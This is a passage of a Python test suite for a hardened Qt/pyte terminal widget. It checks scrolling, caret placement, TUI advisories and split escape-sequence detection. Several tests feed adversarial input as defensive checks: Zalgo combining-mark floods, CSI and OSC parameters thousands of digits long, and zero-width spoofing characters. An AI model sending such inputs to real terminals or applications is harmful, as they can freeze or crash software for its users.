_eoft._read_and_render()                             # the child-exit / EOF path
os.close(_er)
_eoft._flush_paint()
ok('result:' in _eoft.transcript_text() and '!' * 50 in _eoft.transcript_text(),
   'child exit flushes the held escape tail -- the final output is not lost')
_eoft.close()
# home-pin: a terminal does not auto-scroll horizontally -- a paint anchors the view at
# the left so the START of every row stays visible (the reported bug: the auto-follow
# parked the viewport mid-line, clipping every row's left edge) -- but NEVER by hiding
# the caret. Box/Show stay NoWrap, so a long line can overflow; Detail/Reveal wrap.
#
# Build the overflow font-robustly. In normal use the child autowraps output at the
# widget's measured column count, so a NoWrap line overflows the width only when a
# glyph renders WIDER than the measured cell (CJK/emoji in Show mode) -- and CI's
# fonts-hack is monospace with no CJK/emoji, so no real glyph is ever wider there and
# that overflow cannot be reproduced (a CJK run renders zero-width and silently
# disarms the canaries -- the local-vs-CI trap this comment exists to prevent).
# Instead disable the autowrap (_cols = 0 -> the hard-wrap falls back to _MAX_LINE) and
# feed a long ASCII run: it stays ONE block and overflows purely by character count, so
# it overflows identically everywhere. The home-pin logic is glyph-agnostic (it works
# on pixel positions), so this exercises it faithfully.
_LONG = 'M' * 800
# Case A: the caret sits at the far right of an overflowing NoWrap line (interactive
# typing past the edge). It MUST stay visible -- home-pinning it off-screen would hide
# the input and block manual scroll. Guards the ai-review regression an unconditional
# home-pin introduced.
_pinA = SecureTerminal(command='/bin/cat')
_pinA.apply_mode('show')                # NoWrap, so the line can overflow horizontally
_pinA.resize(240, 120)
_pinA.show()
APP.processEvents()
_pinA._cols = 0                          # disable the autowrap so the long line overflows
feed_output(_pinA, _LONG.encode('ascii'))                  # caret at the far right, no LF
_hbA = _pinA.horizontalScrollBar()
ok(_hbA.maximum() > _hbA.minimum(),
   'canary: the long Show line overflows the viewport (else caret-visibility is untested)')
_crA = _pinA.cursorRect()
ok(0 <= _crA.x() and _crA.x() + _pinA.cursorWidth() <= _pinA.viewport().width(),
   'home-pin never hides the caret: the FULL caret (its width included, not just the left '
   'edge) stays within the viewport on an overflowing NoWrap line')
_pinA.close()
# Case B: the overflow lives in the scrollback above and the caret is near the start of
# a short current line, so home-pinning keeps the caret visible AND anchors the line
# starts. Scroll fully right, force a repaint: the view re-homes to column 0. On the old
# code ensureCursorVisible only scrolled the caret into view (left edge), leaving the
# line starts off-screen; the home-pin brings them back.
_pinB = SecureTerminal(command='/bin/cat')
_pinB.apply_mode('show')
_pinB.resize(240, 120)
_pinB.show()
APP.processEvents()
_pinB._cols = 0                          # disable the autowrap so the scrollback line overflows
feed_output(_pinB, (_LONG + '\nM').encode('ascii'))        # long scrollback + short current line
_hbB = _pinB.horizontalScrollBar()
ok(_hbB.maximum() > _hbB.minimum(),
   'canary: the scrollback line overflows the viewport before the repaint')
_hbB.setValue(_hbB.maximum())           # scroll fully right
_pinB._paint_dirty = True               # force a repaint of the current line
_pinB._flush_paint()
eq(_hbB.value(), _hbB.minimum(),
   'home-pin: a paint re-homes to column 0 when that keeps the (col-0) caret visible')
_pinB.close()

# F4: the alt-screen (grid) caret sits at the DISPLAY offset of the cursor column, not the
# raw cell column. A cell that renders to more than one UTF-16 unit (an astral glyph, which
# Show mode passes through) advances the document by more than one position, so `+ cursor.x`
# drifts the caret left. A math-bold 'A' (U+1D400: ONE Python char, TWO UTF-16 units) at
# column 0 with the cursor at column 1 must place the caret at document offset 2, not 1.
# The offset counts UTF-16 units, so it is font-agnostic (no CI CJK/emoji-glyph dependence).
_f4 = SecureTerminal(command='/bin/cat', tui=True)
_f4.apply_mode('show')
_f4.resize(240, 120)
_f4.show()
APP.processEvents()
feed_output(_f4, b'\x1b[?1049h\x1b[2J\x1b[H' + '\U0001d400'.encode('utf-8'))
pump(80)
_f4tc = _f4.textCursor()
_f4off = _f4tc.position() - _f4.document().findBlock(_f4tc.position()).position()
ok(_f4off == 2,
   'grid caret sits after a 2-UTF-16-unit astral cell (offset %d), not at cell column 1'
   % _f4off)
_f4.close()

# TUI grid horizontal home-pin (operator regression): the alt screen is a fixed viewport-wide
# canvas, so column 0 must ALWAYS stay visible -- the horizontal analog of the alt-screen
# top-pin (row 0). _place_grid_cursor's setTextCursor fires ensureCursorVisible, which follows
# the caret RIGHT when a wide grid row overflows and parks the view mid-grid (hiding column 0);
# the home-pin re-homes every frame. Build the overflow font-robustly with ASCII: give the pyte
# grid many more columns than the narrow viewport can show, so a full ASCII row overflows the
# width regardless of glyph rendering (no CJK/emoji-width dependence, which CI's fonts-hack
# lacks -- the local-vs-CI trap the _pinA/_pinB comments also guard).
_hs = SecureTerminal(command='/bin/cat', tui=True)
_hs.resize(240, 120)
_hs.show()
APP.processEvents()
feed_output(_hs, b'\x1b[?1049h')          # enter the alt screen (fixed canvas: top + column-0 pinned)
_HSWIDE = 200
_hs._screen.resize(_hs._screen.lines, _HSWIDE)    # widen the pyte grid well past the viewport
_hs._set_winsize(_HSWIDE, _hs._screen.lines)
feed_output(_hs, b'M' * _HSWIDE)          # one full-width ASCII row; the caret ends at the far right
_hs._render_tui()
_hsbar = _hs.horizontalScrollBar()
ok(_hsbar.maximum() > _hsbar.minimum(),
   'canary: the wide ASCII grid row overflows the narrow viewport (else the home-pin is untested)')
ok(_hs.textCursor().positionInBlock() >= _HSWIDE - 1,
   'canary: the grid caret sits at the far-right edge of the overflowing row, so without the '
   'home-pin ensureCursorVisible would scroll RIGHT off column 0')
_hsbar.setValue(_hsbar.maximum())         # park the view scrolled-right, as ensureCursorVisible would
_hs._place_grid_cursor(_hs._screen)       # caret already visible at max -> only the home-pin moves the view
eq(_hsbar.value(), _hsbar.minimum(),
   'TUI grid pins horizontal scroll HOME (column 0 visible) even with the caret at the far right')
_hs.close()

# --- Zalgo flood: a base char plus thousands of stacked combining marks is one
# grapheme cluster that makes the text engine (Qt in CLI mode, pyte's NFC merge in
# TUI mode) reshape it in O(n^2) -- seconds of GUI freeze per line. The CLI cell
# model (feed_line_edits) and _SafeHistoryScreen.draw (TUI) each bound the marks
# per base cell to the Unicode stream-safe maximum -- escape-, read-boundary- and
# cursor-move-proof -- so a flood renders instantly and a real accent still lands.
import time as _tz                                       # noqa: E402
_ac = '\u0301'                                           # combining acute
# structural: the cap holds in every CLI render mode (100 marks -> at most 32 kept)
for _zm in ('show', 'box', 'reveal'):
    _zt = SecureTerminal(command='/bin/cat'); _zt.apply_mode(_zm)
    feed_output(_zt, ('a' + _ac * 100 + '\n').encode('utf-8'))
    ok(_zt.toPlainText().count(_ac) <= 32,
       'zalgo CLI %s: a 100-mark flood is bounded to <= 32 combining marks' % _zm)
# structural: TUI (pyte) bounds the merged cell too. The trailing CJK char is a
# non-combining non-ASCII code point (>= U+0300), so the run resets and it renders
# in its own cell.
_ztu = SecureTerminal(command='/bin/cat', tui=True)
_cjk = '\u4f60'                                  # a non-combining CJK char
feed_output(_ztu, ('a' + _ac * 100 + _cjk + '\n').encode('utf-8'))
ok(len(_ztu._screen.buffer[0][0].data) <= 34,
   'zalgo TUI: the merged pyte cell is bounded (base + capped marks), not 100')
ok(_ztu._screen.buffer[0][1].data == _cjk,
   'zalgo TUI: a non-combining char after the flood resets the run and lands in its own cell')
# TUI full-width line + bare LF: a line that fills the EXACT grid width parks the cursor in
# pyte's last-column-flag state (cursor.x == columns); pyte defers the wrap to the next printable
# char (its own CR+LF), so a BARE LF (no ONLCR carriage return) would advance a SECOND line and
# insert a blank row between every full-width line. _SafeHistoryScreen.linefeed clears the flag
# but KEEPS the column, exactly as a real terminal does (verified against xterm by an ESC[6n DSR
# probe): no blank row, and the next line staircases from the last column -- NOT normalised to
# column 0. So the first B lands in the last column of row 1 and the rest wrap onto row 2.
_fw = SecureTerminal(command='/bin/cat', tui=True)
_fwc = _fw._screen.columns
feed_output(_fw, ('A' * _fwc + '\n' + 'B' * _fwc + '\n').encode('utf-8'))
ok(_fw._screen.buffer[0][0].data == 'A'
   and _fw._screen.buffer[1][_fwc - 1].data == 'B'          # no blank row: first B at the last column
   and _fw._screen.buffer[2][0].data == 'B',                # the rest wrapped onto the next row
   'TUI full-width line + bare LF: the flag clears and the column is kept (xterm-accurate), '
   'so no blank row and the next line staircases from the last column')
_fw.close()
# F3: an oversized CSI parameter must not permanently freeze pyte rendering. pyte's
# int(param) raises ValueError past sys.get_int_max_str_digits() (4300); the raised
# parser generator is then EXHAUSTED, so without a rebuild every later feed is
# silently dropped and the tab's TUI screen stays frozen for the session. _feed_bytes
# rebuilds the parser (screen state is preserved) so rendering recovers next feed.
_f3 = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_f3, b'\x1b[' + b'9' * 4301 + b'C')       # oversized CSI -> pyte ValueError
feed_output(_f3, b'\x1b[HZ')                            # home + 'Z', fed AFTER the crash
ok(_f3._screen.buffer[0][0].data == 'Z',
   'F3: pyte recovers after an oversized-CSI crash (no permanent TUI desync)')
_f3.close()
# a real accent after a flood still lands (the run resets, not a permanent gag)
_zt2 = SecureTerminal(command='/bin/cat'); _zt2.apply_mode('show')
feed_output(_zt2, ('x' + _ac * 100 + 'y' + _ac + '\n').encode('utf-8'))
ok(('y' + _ac) in _zt2.toPlainText(),
   'zalgo: a base char resets the run so a later real accent is not dropped')
# DoS canary: a large flood (under the pipe buffer) renders fast in both modes;
# unbounded it would take tens of seconds, so a wide margin is not flaky
_zc = ('a' + _ac * 4000 + '\n').encode('utf-8')
_zcli = SecureTerminal(command='/bin/cat'); _zcli.apply_mode('show')
_t0 = _tz.monotonic(); feed_output(_zcli, _zc)
ok(_tz.monotonic() - _t0 < 5.0, 'zalgo CLI: a 4000-mark flood renders well under the DoS threshold')
_ztui = SecureTerminal(command='/bin/cat', tui=True)
_t0 = _tz.monotonic(); feed_output(_ztui, _zc)
ok(_tz.monotonic() - _t0 < 5.0, 'zalgo TUI: a 4000-mark flood renders well under the DoS threshold')
# split-read CLI: a child dripping sub-cap chunks (each read reset to 0) must not
# rebuild the cluster; the trailing run carries across _on_readable calls
_zsr = SecureTerminal(command='/bin/cat'); _zsr.apply_mode('show')
for _ in range(6):
    feed_output(_zsr, (_ac * 20).encode('utf-8'))     # 6 reads x 20 marks = 120
ok(_zsr.toPlainText().count(_ac) <= 32,
   'zalgo CLI: a flood split across PTY reads is still bounded to the cap')
# stripped-SGR CLI bypass: an SGR reset between mark-blocks leaves no cell, so the
# marks stay adjacent to one base -- capping on the raw stream would be fooled, but
# the cell-level cap is not
_zsgr = SecureTerminal(command='/bin/cat'); _zsgr.apply_mode('show')
feed_output(_zsgr, ('a' + (_ac * 20 + '\x1b[0m') * 6).encode('utf-8'))
ok(_zsgr.toPlainText().count(_ac) <= 32,
   'zalgo CLI: a stripped SGR between mark-blocks cannot reset the cap')
# a program printing an OSC with a 5000-digit code must NOT crash the app: int()
# raises on a 4300+-digit string (Python 3.11+), and the CLI OSC-notice scan runs
# in a Qt notifier slot -- no feature opt-in is needed to reach it.
_zosc = SecureTerminal(command='/bin/cat'); _zosc.apply_mode('show')
feed_output(_zosc, b'\x1b]' + b'1' * 5000 + b'\n')
ok(isinstance(_zosc.toPlainText(), str),
   'a 5000-digit OSC code does not crash the CLI render (int 4300-digit limit)')
# and a 5000-digit CSI cursor parameter through the live line-mode path
_zcsi = SecureTerminal(command='/bin/cat'); _zcsi.apply_mode('show')
feed_output(_zcsi, b'a\x1b[' + b'9' * 5000 + b'Cb\n')
ok(isinstance(_zcsi.toPlainText(), str),
   'a 5000-digit CSI parameter does not crash the CLI render')
# cursor-move TUI: steer many capped chunks back onto ONE cell via CSI G; the
# per-cell cap must stop it growing unbounded (the stream-run counter could not)
_zcm = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_zcm, b'a')                                # base into cell 0
for _ in range(6):
    feed_output(_zcm, (_ac * 20 + '\x1b[2G').encode('utf-8'))   # marks onto cell 0, cursor back
ok(len(_zcm._screen.buffer[0][0].data) <= 34,
   'zalgo TUI: cursor moves cannot pile combining marks onto one cell past the cap')
# combining mark at the very screen origin (cursor 0,0): no preceding cell to test,
# so the target lookup takes the no-base branch and pyte simply drops it
_zt0 = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_zt0, _ac.encode('utf-8'))
ok(isinstance(_zt0.toPlainText(), str),
   'zalgo TUI: a combining mark at the screen origin (cursor 0,0) is handled, no crash')
# combining mark at column 0 of a lower row (cursor x=0, y>0): it targets the
# previous row's last cell -- exercises that lookup branch
_ztr = SecureTerminal(command='/bin/cat', tui=True)
feed_output(_ztr, ('abc\r\n' + _ac).encode('utf-8'))
ok(isinstance(_ztr.toPlainText(), str),
   'zalgo TUI: a combining mark at column 0 of a lower row is handled, no crash')

# --- _export_ascii maps the box placeholder to '_' in every mode but Show -----
# A TUI grid renders a neutralized cell as the box placeholder (a <U+XXXX> badge
# cannot fit one cell) in Box/Reveal/Detail, so text LEAVING the widget (copy,
# IPC, session) must map the box back to ASCII '_' in ALL three -- else a copy in
# Reveal/Detail would carry U+25A1 out and raise a spurious unicode review. Show
# keeps the box (it may be a real U+25A1, and Show is the opt-in to copy unicode).
_BOXCH = chr(0x25A1)
_xw = SecureTerminal(command='/bin/cat')
for _xm in ('box', 'reveal', 'detail'):
    _xw._mode = _xm
    ok(_xw._export_ascii('caf' + _BOXCH + 'x') == 'caf_x',
       '_export_ascii maps the box to ASCII _ in %s mode' % _xm)
_xw._mode = 'show'
ok(_xw._export_ascii('caf' + _BOXCH) == 'caf' + _BOXCH,
   '_export_ascii keeps the box in show mode (opt-in to copy unicode)')

# --- "needs TUI" advisory also fires for in-place repaint (zsh ZLE menu) --------
# The bug: an interactive completion menu (zsh/readline) repaints with cursor-up
# and uses no alternate screen, so line mode stripped the redraw into garbage
# WITHOUT advising TUI mode. The advisory must now fire on that repaint too, not
# only on a full-screen (alt-screen) program.
adv = SecureTerminal(command='/bin/cat')
_advices = []
adv.advise_signal.connect(_advices.append)
feed_output(adv, b'plain shell output, no redraw here\n')
ok(_advices == [], 'plain line-mode output raises no TUI advisory')
# a completion-menu-style repaint: print a grid, then cursor-up to repaint in place
feed_output(adv, b'cand1  cand2  cand3\n\x1b[2A\x1b[7mcand1\x1b[27m')
ok(len(_advices) == 1 and 'TUI' in _advices[0],
   'an in-place completion-menu repaint (cursor-up, no alt-screen) advises TUI mode')

# COR-1b: a C0 control byte inside an all-ASCII chunk must NOT take pyte's fast path --
# stock pyte draw() breaks its whole batch on the first wcwidth==-1 byte (`else: break`),
# so the C0 AND the rest of the chunk would vanish unmarked. The per-char loop marks it
# and keeps going.
if tui_available():
    _c0 = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_c0, b'AB\x01CD')
    ok(_c0._screen.buffer[0][2].data == 'C' and _c0._screen.buffer[0][3].data == 'D',
       'COR-1b: a C0 byte in an all-ASCII TUI chunk does not drop the trailing output')
    ok(not _c0._screen.buffer[0][1].data.isprintable(),
       'COR-1b: the C0 control byte is marked into its cell, not silently dropped')
    _c0.close()
# advised at most once per program, so a menu that repaints on every keypress does
# not spam the notice.
feed_output(adv, b'\x1b[2A\x1b[7mcand2\x1b[27m')
ok(len(_advices) == 1, 'the TUI advisory is shown once, not on every repaint')
# a curses app under the RESTRICTED terminfo cannot cursor-address, so it clears
# lines with a BURST of EL instead of moving the cursor (nano) -- still advise (#94).
elb = SecureTerminal(command='/bin/cat')
_elb = []
elb.advise_signal.connect(_elb.append)
elb.has_foreground_program = lambda: True
feed_output(elb, b'\x1b[K' * 5 + b'GNU nano 8.4')
ok(len(_elb) == 1 and 'TUI' in _elb[0],
   '#94: an EL-burst redraw (nano under the restricted entry) advises TUI mode')
# without a foreground program (just the shell) an EL burst does NOT advise
elb2 = SecureTerminal(command='/bin/cat')
_elb2 = []
elb2.advise_signal.connect(_elb2.append)
elb2.has_foreground_program = lambda: False
feed_output(elb2, b'\x1b[K' * 5 + b'text')
ok(_elb2 == [], '#94: an EL burst with no foreground program does not advise')
elb.close(); elb2.close()

# --- a whole-screen clear is a no-op in append-only line mode: note it once ----
clr = SecureTerminal(command='/bin/cat')
_clr_adv = []
clr.advise_signal.connect(_clr_adv.append)
feed_output(clr, b'ordinary output\n')
ok(_clr_adv == [], 'ordinary output raises no clear notice')
feed_output(clr, b'\x1b[H\x1b[2J')          # `clear`: home + erase whole screen
ok(len(_clr_adv) == 1 and 'clear' in _clr_adv[0].lower()
   and 'append-only' in _clr_adv[0],
   'a whole-screen clear is explained (append-only), not silently ignored')
feed_output(clr, b'\x1b[2J')                # a second clear does not re-notify
ok(len(_clr_adv) == 1, 'the clear notice is shown once per tab, not on every clear')
# a full-screen program that clears its screen gets the TUI advisory, not the
# clear notice (its clear is part of drawing, and TUI covers it).
fs = SecureTerminal(command='/bin/cat')
_fs_adv = []
fs.advise_signal.connect(_fs_adv.append)
feed_output(fs, b'\x1b[?1049h\x1b[2Jfull screen app')
ok(len(_fs_adv) == 1 and 'TUI' in _fs_adv[0],
   'a full-screen program that clears raises the TUI advisory, not the clear notice')
# and a LATER clear from that still-active full-screen program (alt screen already
# entered in an earlier chunk, so `entered` is False now) must also stay quiet.
feed_output(fs, b'\x1b[2Jredraw')
ok(len(_fs_adv) == 1,
   'a clear while a full-screen program is already on the alt screen raises no clear notice')

# F6: an alt-screen marker split across an os.read() boundary is still detected -- the
# CLI-mode scan carries a tail between reads (as the sync-2026 scan does).
_asf = SecureTerminal(command='/bin/cat')
ok(not _asf._alt_screen, 'F6: not on the alt screen initially')
feed_output(_asf, b'padding\x1b[?10')            # first half of \x1b[?1049h
ok(not _asf._alt_screen, 'F6: a half marker does not yet flip the alt-screen state')
feed_output(_asf, b'49h\x1b[2Jframe')            # second half -> reunited by the carry
ok(_asf._alt_screen, 'F6: a split alt-screen marker is detected across the read boundary')
_asf.close()

# ...and EVERY split, not one hand-picked cut. The single two-way case above is
# satisfied by carrying the tail of the CHUNK, which loses the introducer once a
# marker spans three or more reads: "\x1b[?1", "04", "9h" leaves carry "\x1b[?1",
# then carry "04" with the ESC gone, so the final probe "049h" matches nothing.
# Only a carry taken from the JOINED probe survives that. Drive the marker one
# byte at a time (the extreme) and at every 2- and 3-way cut, for the alt-screen
# scan and the synchronized-output scan alike.
def _split_feed(payload, cuts):
    """Feed `payload` as separate reads, cut at the given offsets."""
    term = SecureTerminal(command='/bin/cat')
    previous = 0
    for offset in list(cuts) + [len(payload)]:
        feed_output(term, payload[previous:offset])
        previous = offset
    return term


# --- TUI marking of a zero-width character with no preceding cell -------------
# _mark_own_cell: at the very start of the screen there is no cell to merge into,
# so the character occupies its own cell instead of being dropped. A leading
# invisible is exactly the spoofing position that must stay marked.
from secure_terminal import sanitize as _S_zw           # noqa: E402

if tui_available():
    _zw = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_zw, '\u200dab'.encode('utf-8'))
    pump(200)
    _zwdoc = _zw.document().toPlainText()
    ok(_S_zw.BOX in _zwdoc,
       'a LEADING zero-width character is marked in the TUI grid, not dropped')
    ok('\u200d' not in _zwdoc, 'the raw zero-width character never reaches the grid')
    _zw.close()

    # _merge_invisible with the cursor at column 0 of a LATER row: the target is
    # the last column of the PREVIOUS row. That cell must actually have been
    # written -- pyte's row .get() returns None for a column never touched, which
    # takes the no-target path instead -- so fill the row to its last column
    # before the newline.
    _zw2 = SecureTerminal(command='/bin/cat', tui=True)
    _cols2 = _zw2._screen.columns if _zw2._screen is not None else 80
    feed_output(_zw2, ('x' * _cols2).encode('utf-8'))
    pump(120)
    feed_output(_zw2, b'\r\n')
    pump(120)
    feed_output(_zw2, '\u200d'.encode('utf-8'))
    pump(120)
    ok(_S_zw.BOX in _zw2.document().toPlainText(),
       'a zero-width character at column 0 marks the previous row last cell')
    _zw2.close()

    # _mark_own_cell only-mark-never-destroy at the screen origin. The origin is
    # the one place draw() reaches _mark_own_cell (no preceding cell to merge
    # into). Repositioning the cursor back onto an already-drawn origin cell then
    # feeding a zero-width non-combining char (U+200D) must PRESERVE the cell's
    # base character and merely mark it -- the pre-fix code overwrote the cell with
    # just the invisible, destroying the drawn char. Cover all three arms.
    from secure_terminal.terminal import _TUI_COMBINE_CAP as _CAP     # noqa: E402

    # (a) MERGE/preserve (the security assertion): 'A' occupies (0,0), the cursor
    # is homed back to (0,0) with CSI H, then U+200D arrives. The invisible is
    # appended so the base char survives; the cell is no longer purely printable so
    # tui_cell renders the box placeholder (marked, not silently dropped, and not
    # overwritten).
    _mo = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_mo, b'A\x1b[H')                        # draw 'A' at (0,0), home the cursor
    feed_output(_mo, '\u200d'.encode('utf-8'))          # zero-width joiner onto the occupied cell
    pump(120)
    _mocell = _mo._screen.buffer[0][0].data
    ok(_mocell.startswith('A'),
       'TUI origin merge: a zero-width char preserves the occupied origin cell base char '
       '(never overwritten with just the invisible)')
    ok('\u200d' in _mocell,
       'TUI origin merge: the invisible is appended so the origin cell is marked')
    ok(_S_zw.BOX in _mo.document().toPlainText(),
       'TUI origin merge: the marked origin cell renders the box placeholder')
    _mo.close()

    # (b) CAP: the origin cell already holds a base plus the stream-safe maximum of
    # combining marks (data longer than _TUI_COMBINE_CAP). A further zero-width
    # char at the repositioned origin is DROPPED -- no unbounded growth, cursor not
    # advanced -- so steering a flood back onto one cell cannot bypass the cap.
    _mc = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_mc, ('A' + '\u0301' * 40).encode('utf-8'))   # base + acute flood -> cell over the cap
    feed_output(_mc, b'\x1b[H')                                # home onto the capped origin cell
    pump(120)
    _before = _mc._screen.buffer[0][0].data
    ok(len(_before) > _CAP,
       'TUI origin cap: the origin cell is over the combining cap before the extra mark')
    feed_output(_mc, '\u200d'.encode('utf-8'))
    pump(120)
    _after = _mc._screen.buffer[0][0].data
    ok(_after == _before,
       'TUI origin cap: a zero-width char on an already-capped origin cell is dropped (no growth)')
    ok(_mc._screen.cursor.x == 0,
       'TUI origin cap: the cursor is not advanced when the extra invisible is dropped')
    _mc.close()

    # (c) EMPTY (pre-existing behavior preserved): a zero-width char on an EMPTY
    # origin occupies its own cell and advances the cursor, so a leading invisible
    # is marked rather than dropped.
    _me = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_me, '\u200d'.encode('utf-8'))
    pump(120)
    ok(_me._screen.buffer[0].get(0) is not None,
       'TUI origin empty: a leading zero-width char occupies the empty origin cell')
    ok(_me._screen.cursor.x == 1,
       'TUI origin empty: the cursor advances past the newly occupied origin cell')
    ok(_S_zw.BOX in _me.document().toPlainText(),
       'TUI origin empty: the marked origin cell renders the box placeholder')
    _me.close()

# --- a tab closed right after opening is not "a program is still running" -----
# has_foreground_program() returns True whenever the tty's foreground pgrp differs
# from the child's -- and between pty.fork() and the child's execvp the tty is
# still owned by OUR process group, so a plain login-shell tab transiently looked
# like a running program. Closing such a tab then asked "A program is still
# running in this tab": a spurious prompt for a user, and an unanswerable modal
# that hung the test harness for over an hour.
import secure_terminal.terminal as _T_fg                        # noqa: E402

_fg = SecureTerminal(command=None)          # a login-shell tab, no -- PROGRAM
_o_fgpgrp = _T_fg.SecureTerminal._foreground_pgrp
_o_getpgid = _T_fg.os.getpgid
try:
    # Pin the child-pgrp lookup to a live, distinct pgrp: the real login-shell child
    # is auto-reaped (SIGCHLD SIG_IGN), so a real os.getpgid(self._pid) FLAKES between
    # a valid pgrp and ProcessLookupError -- and the early-return on that error skipped
    # the "still owned by us" branch below, flapping the coverage gate. Mocking it makes
    # the branch deterministic without depending on the child still being alive.
    _T_fg.os.getpgid = lambda _pid: os.getpgrp() + 50000
    # Simulate the startup window: the tty is still ours.
    _T_fg.SecureTerminal._foreground_pgrp = lambda _self: os.getpgrp()
    ok(_fg.has_foreground_program() is False,
       'a shell tab whose tty is still owned by us is not a foreground program')
    # A genuinely different pgrp is still reported, so the guard is not a blanket
    # "always False" -- that would disable the Terminate action entirely.
    _T_fg.SecureTerminal._foreground_pgrp = lambda _self: os.getpgrp() + 100000
    ok(_fg.has_foreground_program() is True,
       'a third-party foreground pgrp is still reported as a running program')
finally:
    _T_fg.SecureTerminal._foreground_pgrp = _o_fgpgrp
    _T_fg.os.getpgid = _o_getpgid
_fg.close()

# --- cli_terminfo_dir freshness: no-source, and an unreadable mtime -----------
# _fresh() decides whether a compiled terminfo directory may be used. Two arms
# are only reachable with a prepared cache: "no shipped source, so nothing to be
# stale against", and "the mtimes cannot be read at all".
import secure_terminal.terminal as _T_cov                       # noqa: E402

_ti_root = tempfile.mkdtemp(prefix='st-ti-cov-')
_ti_s = os.path.join(_ti_root, 'secure-terminal', 'terminfo', 's')
os.makedirs(_ti_s, exist_ok=True)
for _name in ('secure-terminal', 'secure-terminal-noedit'):
    with open(os.path.join(_ti_s, _name), 'wb') as _fh:
        _fh.write(b'x')
_ti_src_orig = _T_cov._terminfo_source
_ti_xdg_prev = os.environ.get('XDG_CACHE_HOME')
_ti_mtime_orig = _T_cov.os.path.getmtime
try:
    os.environ['XDG_CACHE_HOME'] = _ti_root
    _T_cov._terminfo_source = lambda: ''        # nothing shipped to compare against
    eq(_T_cov.cli_terminfo_dir(),
       os.path.join(_ti_root, 'secure-terminal', 'terminfo'),
       'cli_terminfo_dir accepts a complete cache when no source ships')

    # ...and an unreadable mtime is "not fresh", not a crash.
    _T_cov._terminfo_source = lambda: os.path.join(_ti_root, 'src.ti')
    with open(os.path.join(_ti_root, 'src.ti'), 'wb') as _fh:
        _fh.write(b'x')

    def _mtime_boom(_path):
        raise OSError('mtime unavailable')

    _T_cov.os.path.getmtime = _mtime_boom
    ok(_T_cov.cli_terminfo_dir() != os.path.join(_ti_root, 'secure-terminal',
                                                 'terminfo'),
       'an unreadable mtime makes a compiled terminfo dir not fresh')
finally:
    _T_cov.os.path.getmtime = _ti_mtime_orig
    _T_cov._terminfo_source = _ti_src_orig
    if _ti_xdg_prev is None:
        os.environ.pop('XDG_CACHE_HOME', None)
    else:
        os.environ['XDG_CACHE_HOME'] = _ti_xdg_prev

# --- _flush_reexport retires a tab that can no longer be re-exported into ------
_fx = SecureTerminal(command='/bin/cat')          # a -- COMMAND tab, never re-exported
_fx._reexport_pending = True
_fx._flush_reexport()
ok(not _fx._reexport_pending,
   'a deferred re-export is dropped once the tab is no longer re-exportable')
_fx.close()

# --- _child_raw_mode: no fd, and an unreadable line discipline -----------------
_rm = SecureTerminal(command='/bin/cat')
_rm_fd = _rm._fd
try:
    _rm._fd = None
    ok(_rm._child_raw_mode() is False, '_child_raw_mode with no fd is False')
    _rm._fd = _rm_fd
    _o_tcget = _T_cov.termios.tcgetattr
    try:
        def _boom(*_a, **_k):
            raise _T_cov.termios.error('no line discipline')
        _T_cov.termios.tcgetattr = _boom
        ok(_rm._child_raw_mode() is False,
           '_child_raw_mode is False when the line discipline cannot be read')
    finally:
        _T_cov.termios.tcgetattr = _o_tcget
finally:
    _rm._fd = _rm_fd
_rm.close()

_MARKER = b'\x1b[?1049h'
_bad = []
for _k in range(1, len(_MARKER)):                       # every 2-way split
    _t = _split_feed(_MARKER, [_k])
    if not _t._alt_screen:
        _bad.append((_k,))
    _t.close()
for _k1 in range(1, len(_MARKER)):                      # every 3-way split
    for _k2 in range(_k1 + 1, len(_MARKER)):
        _t = _split_feed(_MARKER, [_k1, _k2])
        if not _t._alt_screen:
            _bad.append((_k1, _k2))
        _t.close()
eq(_bad, [], 'F6: the alt-screen marker is detected at every 2- and 3-way split')

_t = _split_feed(_MARKER, list(range(1, len(_MARKER))))  # 1-byte drip
ok(_t._alt_screen, 'F6: the alt-screen marker survives a one-byte-per-read drip')
_t.close()

# The synchronized-output (DECSET 2026) scan carries a tail the same way, so it
# has the same failure mode and needs the same proof.
_SYNC = b'\x1b[?2026h'
_bad = []
for _k1 in range(1, len(_SYNC)):
    for _k2 in range(_k1 + 1, len(_SYNC)):
        _t = _split_feed(_SYNC, [_k1, _k2])
        if not _t._sync_update:
            _bad.append((_k1, _k2))
        _t.close()
eq(_bad, [], 'F6: the sync-2026 BEGIN marker is seen at every 3-way split')
if tui_available():
    # F6 (TUI feed): a split marker is reunited before feeding pyte (so snapshot/restore
    # is not done on HALF a marker), while a COMPLETE read is fed whole (not delayed).
    _ast = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_ast, b'frame\x1b[?10')          # ends mid-marker -> partial tail HELD
    feed_output(_ast, b'49h\x1b[2Jnext')          # reunites + feeds the whole marker
    ok(True, 'F6: the TUI feed reunites a split alt-screen marker without crashing')
    _ast.close()

# --- full-screen program drive (E2E): start a REAL full-screen program in TUI mode,
# confirm it renders a frame in the pyte grid, send its quit key, confirm a clean exit.
# Answers "can we drive vim/htop/tmux at all?" -- yes, headlessly, no screenshot needed
# (toPlainText reads the grid). ssh needs a remote target so it stays a manual capture.
# These programs are declared test dependencies (.github/dm-consumer.yml apt-packages),
# so a missing one FAILS rather than silently skipping: a security-relevant E2E must
# never quietly disable itself, and a silent skip here reads as a pass.
if tui_available():
    import shutil as _e2e_which                          # noqa: E402

    def _drive_fullscreen(cmd, ready, quit_bytes, name, expect_exit=True):
        if not _e2e_which.which(cmd[0]):
            ok(False, 'E2E: %s is installed (test dependency %r missing)'
               % (name, cmd[0]))
            return
        _ft = SecureTerminal(command=cmd, tui=True)
        _frame = ''
        for _ in range(200):
            pump(50)
            _frame = _ft.toPlainText()
            if ready in _frame:
                break
        ok(ready in _frame,
           'E2E: %s renders a frame in TUI mode (saw %r)' % (name, ready))
        _ex = []
        _ft.shell_exited.connect(lambda: _ex.append(1))
        if _ft._fd is not None:
            os.write(_ft._fd, quit_bytes)                 # send the program's quit key
        if expect_exit:
            for _ in range(120):
                pump(50)
                if _ex:
                    break
            ok(bool(_ex), 'E2E: %s exits cleanly on its quit key' % name)
        _ft.close()

    _drive_fullscreen(['vim', '-u', 'NONE', '-N'], '~', b'\x1b:q!\r', 'vim')
